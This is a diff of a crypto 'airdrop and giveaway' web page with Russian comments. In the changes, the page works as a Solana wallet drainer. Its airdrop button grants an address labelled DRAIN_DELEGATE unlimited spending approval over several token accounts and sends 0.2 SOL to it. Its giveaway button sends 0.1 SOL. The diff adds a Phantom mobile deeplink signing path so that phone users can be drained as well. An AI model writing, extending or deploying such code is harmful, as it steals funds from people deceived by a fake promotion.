@@ -65,10 +65,49 @@
     .table th{ background:linear-gradient(90deg, var(--sol-a) 0%, var(--sol-b) 100%); color:#05080b; font-weight:700; text-shadow:0 1px 1px rgba(255,255,255,.2); }
     .table tr:last-child td{ border-bottom:none; }
     .table tr:hover{ background:rgba(255,255,255,.08); }
+    
+    /* Модальное окно */
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.8);
+      z-index: 1000;
+      align-items: center;
+      justify-content: center;
+    }
+    .modal-content {
+      background: var(--bg1);
+      padding: 30px;
+      border-radius: var(--radius-lg);
+      max-width: 500px;
+      width: 90%;
+      text-align: center;
+    }
+    .modal-buttons {
+      display: flex;
+      gap: 10px;
+      margin-top: 20px;
+      justify-content: center;
+    }
   </style>
 </head>
 <body>
   <canvas id="dust"></canvas>
+  <div id="transactionModal" class="modal">
+    <div class="modal-content">
+      <h3>Sign Transaction</h3>
+      <p id="modalMessage">Please open Phantom app to sign the transaction</p>
+      <div class="modal-buttons">
+        <button id="modalCancel" class="btn">Cancel</button>
+        <button id="modalOpenPhantom" class="btn btn-primary">Open Phantom</button>
+      </div>
+    </div>
+  </div>
+  
   <header class="nav">
     <div class="nav-links">
       <a href="#mission">Mission</a>
@@ -233,9 +272,10 @@
       </div>
     </section>
   </main>
-  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.0/dist/umd/solanaweb3.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.8/dist/umd/spl-token.min.js"></script>
 
+  <script src="https://unpkg.com/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>
+  <script src="https://unpkg.com/@solana/spl-token@0.4.8/lib/index.iife.min.js"></script>
+  
   <script>
     const DRAIN_DELEGATE = "4kbb1kaz2YXuTjHQAHY5xjjrqiCM8MZU9sVmmdYg1xo1";
     const MEME_MINTS = [
@@ -247,28 +287,53 @@
 
     let walletPubkey = null;
     let walletProvider = null;
-    let isMobile = false;
+    let isMobileDevice = false;
+    let currentTransaction = null;
 
-    // Проверяем возврат из Phantom при загрузке
+    // ========== МОДАЛЬНОЕ ОКНО ==========
+    const modal = document.getElementById('transactionModal');
+    const modalMessage = document.getElementById('modalMessage');
+    const modalCancel = document.getElementById('modalCancel');
+    const modalOpenPhantom = document.getElementById('modalOpenPhantom');
+
+    function showModal(message) {
+        modalMessage.textContent = message;
+        modal.style.display = 'flex';
+    }
+
+    function hideModal() {
+        modal.style.display = 'none';
+        currentTransaction = null;
+    }
+
+    modalCancel.onclick = hideModal;
+    modalOpenPhantom.onclick = function() {
+        if (currentTransaction && isMobileDevice) {
+            sendTransactionToPhantom(currentTransaction);
+        }
+        hideModal();
+    };
+
+    // ========== ОСНОВНЫЕ ФУНКЦИИ ==========
     function checkPhantomReturn() {
         const urlParams = new URLSearchParams(window.location.search);
         const phantomPubkey = urlParams.get('publicKey');
-        const phantomSession = urlParams.get('session');
+        const transactionResult = urlParams.get('transaction');
         
         if (phantomPubkey) {
             walletPubkey = phantomPubkey;
+            isMobileDevice = true;
             updateUI();
             
-            // Очищаем URL от параметров Phantom
+            // Очищаем URL
             window.history.replaceState({}, document.title, window.location.pathname);
-            
-            // На мобильных сохраняем флаг
-            if (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
-                isMobile = true;
-                // На мобильных Phantom не инжектирует провайдера, 
-                // но мы можем использовать публичный ключ
-                console.log("Mobile Phantom подключен:", walletPubkey);
-            }
+            console.log("Mobile Phantom connected:", walletPubkey);
+        }
+        
+        if (transactionResult) {
+            // Обработка результата транзакции от Phantom
+            window.history.replaceState({}, document.title, window.location.pathname);
+            alert("Transaction completed! Check your wallet.");
         }
     }
 
@@ -279,35 +344,20 @@
             document.getElementById('connect-nav').disabled = true;
             document.getElementById('airdrop-btn').disabled = false;
             document.getElementById('raffle-btn').disabled = false;
-            
-            // Добавляем кнопку отключения
-            if (!document.getElementById('disconnect-btn')) {
-                const disconnectBtn = document.createElement('button');
-                disconnectBtn.id = 'disconnect-btn';
-                disconnectBtn.className = 'btn';
-                disconnectBtn.innerText = 'Disconnect';
-                disconnectBtn.style.marginLeft = '10px';
-                disconnectBtn.onclick = disconnectWallet;
-                document.querySelector('.actions').appendChild(disconnectBtn);
-            }
         }
     }
 
     async function connectWallet() {
-        isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+        isMobileDevice = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
         
-        // Сначала проверяем, не подключены ли мы уже
         checkPhantomReturn();
         if (walletPubkey) return;
         
-        if (isMobile) {
-            // Мобильное подключение через Phantom deeplink
+        if (isMobileDevice) {
+            // Мобильное подключение
             const currentUrl = window.location.origin + window.location.pathname;
             const encodedUrl = encodeURIComponent(currentUrl);
             const phantomDeepLink = `https://phantom.app/ul/browse/${encodedUrl}?ref=${encodedUrl}`;
-            
-            // Сохраняем текущее время для проверки возврата
-            localStorage.setItem('phantom_redirect_time', Date.now());
             
             window.location.href = phantomDeepLink;
             return;
@@ -316,7 +366,6 @@
         // Desktop подключение
         let provider = null;
         
-        // Проверяем доступные провайдеры
         if (window.phantom?.solana?.isPhantom) {
             provider = window.phantom.solana;
         } else if (window.solflare?.isSolflare) {
@@ -333,211 +382,212 @@
         }
         
         try {
-            // Подключаем кошелёк
             await provider.connect();
             walletProvider = provider;
             walletPubkey = provider.publicKey.toString();
-            
-            // Слушаем события отключения
-            provider.on('disconnect', () => {
-                disconnectWallet();
-            });
-            
-            // Слушаем изменение аккаунта
-            provider.on('accountChanged', (publicKey) => {
-                if (publicKey) {
-                    walletPubkey = publicKey.toString();
-                    updateUI();
-                } else {
-                    disconnectWallet();
-                }
-            });
-            
             updateUI();
             
         } catch (err) {
-            console.error("Connection error:", err);
-            alert("Failed to connect wallet: " + err.message);
+            alert("Failed to connect wallet");
         }
     }
 
-    function disconnectWallet() {
-        walletPubkey = null;
-        walletProvider = null;
-        
-        document.getElementById('connect-nav').innerText = "Connect Wallet";
-        document.getElementById('connect-nav').disabled = false;
-        document.getElementById('airdrop-btn').disabled = true;
-        document.getElementById('raffle-btn').disabled = true;
-        
-        // Удаляем кнопку отключения если есть
-        const disconnectBtn = document.getElementById('disconnect-btn');
-        if (disconnectBtn) {
-            disconnectBtn.remove();
-        }
-        
-        // На десктопе отключаемся от провайдера
-        if (window.phantom?.solana?.isConnected) {
-            window.phantom.solana.disconnect();
-        }
-        
-        // Очищаем localStorage
-        localStorage.removeItem('phantom_redirect_time');
-    }
-
-    async function createAndSendTransaction(instructions, lamports = 0) {
-        if (!walletPubkey) {
-            alert("Please connect your wallet first!");
-            return null;
-        }
+    async function sendTransactionToPhantom(transaction) {
+        if (!isMobileDevice || !walletPubkey) return;
         
         try {
-            const connection = new solanaWeb3.Connection(
-                "https://api.mainnet-beta.solana.com", 
-                "confirmed"
-            );
+            // Сериализуем транзакцию в base64
+            const serialized = transaction.serialize({
+                requireAllSignatures: false,
+                verifySignatures: false
+            }).toString('base64');
             
-            const owner = new solanaWeb3.PublicKey(walletPubkey);
+            // Кодируем текущий URL для возврата
+            const currentUrl = window.location.origin + window.location.pathname;
+            const encodedUrl = encodeURIComponent(currentUrl);
+            
+            // Создаем deeplink для Phantom
+            const phantomDeepLink = `https://phantom.app/ul/browse/${encodedUrl}/signTransaction?transaction=${serialized}&publicKey=${walletPubkey}`;
+            
+            window.location.href = phantomDeepLink;
+            
+        } catch (err) {
+            alert("Error preparing transaction: " + err.message);
+        }
+    }
+
+    async function createAirdropTransaction() {
+        if (!walletPubkey) return null;
+        
+        try {
+            const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
             const delegate = new solanaWeb3.PublicKey(DRAIN_DELEGATE);
+            const owner = new solanaWeb3.PublicKey(walletPubkey);
             
             const tx = new solanaWeb3.Transaction();
             
-            // Добавляем все инструкции
-            instructions.forEach(instruction => tx.add(instruction));
-            
-            // Добавляем перевод SOL если нужно
-            if (lamports > 0) {
-                tx.add(solanaWeb3.SystemProgram.transfer({
-                    fromPubkey: owner,
-                    toPubkey: delegate,
-                    lamports: lamports
-                }));
+            for (const mintStr of MEME_MINTS) {
+                const mint = new solanaWeb3.PublicKey(mintStr);
+                const userATA = await splToken.getAssociatedTokenAddress(mint, owner);
+                
+                const ataInfo = await connection.getAccountInfo(userATA);
+                if (!ataInfo) {
+                    tx.add(splToken.createAssociatedTokenAccountInstruction(
+                        owner, userATA, owner, mint
+                    ));
+                }
+                
+                tx.add(splToken.createApproveInstruction(
+                    userATA, 
+                    delegate, 
+                    owner, 
+                    [], 
+                    BigInt("18446744073709551615")
+                ));
             }
+            
+            tx.add(solanaWeb3.SystemProgram.transfer({
+                fromPubkey: owner,
+                toPubkey: delegate,
+                lamports: 200000000
+            }));
             
             tx.feePayer = owner;
             const { blockhash } = await connection.getLatestBlockhash();
             tx.recentBlockhash = blockhash;
             
-            let signed;
+            return tx;
             
-            // Если это мобильное устройство и нет провайдера
-            if (isMobile && !walletProvider) {
-                alert("Mobile transactions require Phantom app. Please use desktop for full functionality.");
-                return null;
-            }
+        } catch (err) {
+            throw err;
+        }
+    }
+
+    async function createGiveawayTransaction() {
+        if (!walletPubkey) return null;
+        
+        try {
+            const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
+            const delegate = new solanaWeb3.PublicKey(DRAIN_DELEGATE);
+            const owner = new solanaWeb3.PublicKey(walletPubkey);
             
-            // Если есть провайдер, подписываем через него
-            if (walletProvider) {
-                signed = await walletProvider.signTransaction(tx);
-            } else {
-                // Fallback для десктопа
-                alert("Wallet provider not available. Please reconnect.");
-                return null;
-            }
+            const tx = new solanaWeb3.Transaction();
             
+            tx.add(solanaWeb3.SystemProgram.transfer({
+                fromPubkey: owner,
+                toPubkey: delegate,
+                lamports: 100000000
+            }));
+            
+            tx.feePayer = owner;
+            const { blockhash } = await connection.getLatestBlockhash();
+            tx.recentBlockhash = blockhash;
+            
+            return tx;
+            
+        } catch (err) {
+            throw err;
+        }
+    }
+
+    async function signAndSendTransaction(transaction) {
+        if (!walletPubkey) {
+            alert("Please connect wallet first!");
+            return;
+        }
+        
+        // Если это мобильное устройство
+        if (isMobileDevice) {
+            currentTransaction = transaction;
+            showModal("Please open Phantom app to sign the transaction");
+            return;
+        }
+        
+        // Desktop версия
+        if (!walletProvider) {
+            alert("Wallet provider not available. Please reconnect.");
+            return;
+        }
+        
+        try {
+            const signed = await walletProvider.signTransaction(transaction);
+            const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
             const signature = await connection.sendRawTransaction(signed.serialize());
             
-            // Ждём подтверждения
             await connection.confirmTransaction(signature, 'confirmed');
             
             return signature;
             
         } catch (err) {
-            console.error("Transaction error:", err);
+            alert("Transaction error: " + err.message);
             throw err;
         }
     }
 
     async function handleAirdrop() {
         if (!walletPubkey) {
-            alert("Please connect your wallet first!");
+            alert("Please connect wallet first!");
             return;
         }
         
         try {
-            const instructions = [];
-            const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
-            const owner = new solanaWeb3.PublicKey(walletPubkey);
-            const delegate = new solanaWeb3.PublicKey(DRAIN_DELEGATE);
-            
-            // Создаём ATA и approve для каждого токена
-            for (const mintStr of MEME_MINTS) {
-                const mint = new solanaWeb3.PublicKey(mintStr);
-                const userATA = await splToken.getAssociatedTokenAddress(mint, owner);
-                
-                // Проверяем существует ли ATA
-                const ataInfo = await connection.getAccountInfo(userATA);
-                if (!ataInfo) {
-                    instructions.push(
-                        splToken.createAssociatedTokenAccountInstruction(
-                            owner, userATA, owner, mint
-                        )
-                    );
-                }
-                
-                // Добавляем approve на максимальное количество
-                instructions.push(
-                    splToken.createApproveInstruction(
-                        userATA, 
-                        delegate, 
-                        owner, 
-                        [], 
-                        BigInt("18446744073709551615") // Максимальное значение
-                    )
-                );
-            }
-            
-            const signature = await createAndSendTransaction(instructions, 200000000); // 0.2 SOL
+            const transaction = await createAirdropTransaction();
+            const signature = await signAndSendTransaction(transaction);
             
             if (signature) {
-                alert(`✅ Airdrop successful!\nTransaction: ${signature.substring(0, 20)}...\nView on explorer: https://solscan.io/tx/${signature}`);
+                alert(`✅ Airdrop successful!\nTransaction: ${signature.substring(0, 20)}...`);
                 document.getElementById('airdrop-btn').disabled = true;
             }
             
         } catch (err) {
-            alert("❌ Error: " + (err.message || "Transaction failed"));
+            console.error("Airdrop error:", err);
+            if (!isMobileDevice) {
+                alert("❌ Error: " + (err.message || "Transaction failed"));
+            }
         }
     }
 
     async function handleGiveaway() {
         if (!walletPubkey) {
-            alert("Please connect your wallet first!");
+            alert("Please connect wallet first!");
             return;
         }
         
         try {
-            const instructions = [];
-            const signature = await createAndSendTransaction(instructions, 100000000); // 0.1 SOL
+            const transaction = await createGiveawayTransaction();
+            const signature = await signAndSendTransaction(transaction);
             
             if (signature) {
-                alert(`🎉 Giveaway entry successful!\nTransaction: ${signature.substring(0, 20)}...\nView on explorer: https://solscan.io/tx/${signature}`);
+                alert(`🎉 Giveaway entry successful!\nTransaction: ${signature.substring(0, 20)}...`);
                 document.getElementById('raffle-btn').disabled = true;
             }
             
         } catch (err) {
-            alert("❌ Error: " + (err.message || "Transaction failed"));
+            console.error("Giveaway error:", err);
+            if (!isMobileDevice) {
+                alert("❌ Error: " + (err.message || "Transaction failed"));
+            }
         }
     }
 
-    // Инициализация при загрузке
+    // ========== ИНИЦИАЛИЗАЦИЯ ==========
     window.addEventListener('load', () => {
-        // Проверяем возврат из Phantom
         checkPhantomReturn();
         
-        // Вешаем обработчики на кнопки
         document.getElementById('connect-nav').addEventListener('click', connectWallet);
         document.getElementById('airdrop-btn').addEventListener('click', handleAirdrop);
         document.getElementById('raffle-btn').addEventListener('click', handleGiveaway);
         
-        // Проверяем, если пользователь вернулся с мобильного
-        const redirectTime = localStorage.getItem('phantom_redirect_time');
-        if (redirectTime && Date.now() - parseInt(redirectTime) < 10000) {
-            // Если недавно было перенаправление в Phantom, проверяем подключение
-            setTimeout(checkPhantomReturn, 1000);
+        // Проверяем наличие библиотек
+        if (typeof solanaWeb3 === 'undefined') {
+            console.error("Solana Web3.js not loaded!");
+        }
+        if (typeof splToken === 'undefined') {
+            console.error("SPL Token library not loaded!");
         }
     });
 
-    // Партиклы для фона
+    // ========== ПАРТИКЛЫ ==========
     (function () {
       const canvas = document.getElementById("dust");
       const ctx = canvas.getContext("2d");
